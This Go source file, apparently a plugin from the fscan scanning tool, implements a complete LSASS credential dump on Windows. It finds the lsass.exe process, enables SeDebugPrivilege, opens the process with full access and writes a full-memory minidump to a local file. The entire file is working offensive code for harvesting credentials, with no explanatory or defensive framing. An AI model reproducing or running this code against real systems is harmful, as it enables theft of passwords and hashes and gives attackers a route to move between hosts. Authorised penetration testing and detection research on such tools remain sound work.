package Plugins

import (
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"golang.org/x/sys/windows"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

const (
	TH32CS_SNAPPROCESS   = 0x00000002
	INVALID_HANDLE_VALUE = ^uintptr(0)
	MAX_PATH             = 260

	PROCESS_ALL_ACCESS   = 0x1F0FFF
	SE_PRIVILEGE_ENABLED = 0x00000002

	ERROR_SUCCESS = 0
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// ProcessManager handles process-related operations
type ProcessManager struct {
	kernel32 *syscall.DLL
	dbghelp  *syscall.DLL
	advapi32 *syscall.DLL
}

// Create a new process manager
func NewProcessManager() (*ProcessManager, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return nil, fmt.Errorf("Failed to load kernel32.dll: %v", err)
	}

	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
	if err != nil {
		return nil, fmt.Errorf("Failed to load Dbghelp.dll: %v", err)
	}

	advapi32, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return nil, fmt.Errorf("Failed to load advapi32.dll: %v", err)
	}

	return &ProcessManager{
		kernel32: kernel32,
		dbghelp:  dbghelp,
		advapi32: advapi32,
	}, nil
}

func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
	proc := pm.kernel32.MustFindProc("CreateToolhelp32Snapshot")
	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if handle == uintptr(INVALID_HANDLE_VALUE) {
		return 0, fmt.Errorf("Failed to create process snapshot: %v", err)
	}
	return handle, nil
}

func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (uint32, error) {
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	proc32First := pm.kernel32.MustFindProc("Process32FirstW")
	proc32Next := pm.kernel32.MustFindProc("Process32NextW")
	lstrcmpi := pm.kernel32.MustFindProc("lstrcmpiW")

	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0, fmt.Errorf("Failed to get the first process")
	}

	for {
		ret, _, _ = lstrcmpi.Call(
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
			uintptr(unsafe.Pointer(&pe32.szExeFile[0])),
		)

		if ret == 0 {
			return pe32.th32ProcessID, nil
		}

		ret, _, _ = proc32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("Process not found: %s", name)
}

func (pm *ProcessManager) closeHandle(handle uintptr) {
	proc := pm.kernel32.MustFindProc("CloseHandle")
	proc.Call(handle)
}

func (pm *ProcessManager) ElevatePrivileges() error {
	handle, err := pm.getCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("Failed to open process token: %v", err)
	}
	defer token.Close()

	var tokenPrivileges TOKEN_PRIVILEGES

	lookupPrivilegeValue := pm.advapi32.MustFindProc("LookupPrivilegeValueW")
	ret, _, err := lookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("SeDebugPrivilege"))),
		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
	)
	if ret == 0 {
		return fmt.Errorf("Failed to lookup privilege value: %v", err)
	}

	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	adjustTokenPrivileges := pm.advapi32.MustFindProc("AdjustTokenPrivileges")
	ret, _, err = adjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tokenPrivileges)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("Failed to adjust token privileges: %v", err)
	}

	return nil
}

func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
	handle, _, _ := proc.Call()
	if handle == 0 {
		return 0, fmt.Errorf("Failed to get current process handle")
	}
	return syscall.Handle(handle), nil
}

func (pm *ProcessManager) DumpProcess(pid uint32, outputPath string) error {
	processHandle, err := pm.openProcess(pid)
	if err != nil {
		return err
	}
	defer pm.closeHandle(processHandle)

	fileHandle, err := pm.createDumpFile(outputPath)
	if err != nil {
		return err
	}
	defer pm.closeHandle(fileHandle)

	miniDumpWriteDump := pm.dbghelp.MustFindProc("MiniDumpWriteDump")
	ret, _, err := miniDumpWriteDump.Call(
		processHandle,
		uintptr(pid),
		fileHandle,
		0x00061907, // MiniDumpWithFullMemory
		0,
		0,
		0,
	)

	if ret == 0 {
		return fmt.Errorf("Failed to write dump file: %v", err)
	}

	return nil
}

func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
	proc := pm.kernel32.MustFindProc("OpenProcess")
	handle, _, err := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if handle == 0 {
		return 0, fmt.Errorf("Failed to open process: %v", err)
	}
	return handle, nil
}

func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	createFile := pm.kernel32.MustFindProc("CreateFileW")
	handle, _, err := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		syscall.GENERIC_WRITE,
		0,
		0,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if handle == INVALID_HANDLE_VALUE {
		return 0, fmt.Errorf("Failed to create file: %v", err)
	}

	return handle, nil
}

// Find the target process
func (pm *ProcessManager) FindProcess(name string) (uint32, error) {
	snapshot, err := pm.createProcessSnapshot()
	if err != nil {
		return 0, err
	}
	defer pm.closeHandle(snapshot)

	return pm.findProcessInSnapshot(snapshot, name)
}

// Check if the user has admin privileges
func IsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	return err == nil && member
}

func MiniDump(info *Common.HostInfo) (err error) {
	// First check for admin privileges
	if !IsAdmin() {
		Common.LogError("Administrator privileges are required to perform this operation")
		return fmt.Errorf("Administrator privileges are required to perform this operation")
	}

	pm, err := NewProcessManager()
	if err != nil {
		Common.LogError(fmt.Sprintf("Failed to initialize process manager: %v", err))
		return fmt.Errorf("Failed to initialize process manager: %v", err)
	}

	// Find lsass.exe
	pid, err := pm.FindProcess("lsass.exe")
	if err != nil {
		Common.LogError(fmt.Sprintf("Failed to find process: %v", err))
		return fmt.Errorf("Failed to find process: %v", err)
	}
	Common.LogSuccess(fmt.Sprintf("Found process lsass.exe, PID: %d", pid))

	// Elevate privileges
	if err := pm.ElevatePrivileges(); err != nil {
		Common.LogError(fmt.Sprintf("Failed to elevate privileges: %v", err))
		return fmt.Errorf("Failed to elevate privileges: %v", err)
	}
	Common.LogSuccess("Successfully elevated process privileges")

	// Create output path
	outputPath := filepath.Join(".", fmt.Sprintf("fscan-%d.dmp", pid))

	// Perform dump
	if err := pm.DumpProcess(pid, outputPath); err != nil {
		os.Remove(outputPath)
		Common.LogError(fmt.Sprintf("Failed to dump process: %v", err))
		return fmt.Errorf("Failed to dump process: %v", err)
	}

	Common.LogSuccess(fmt.Sprintf("Successfully dumped process memory to file: %s", outputPath))
	return nil
}
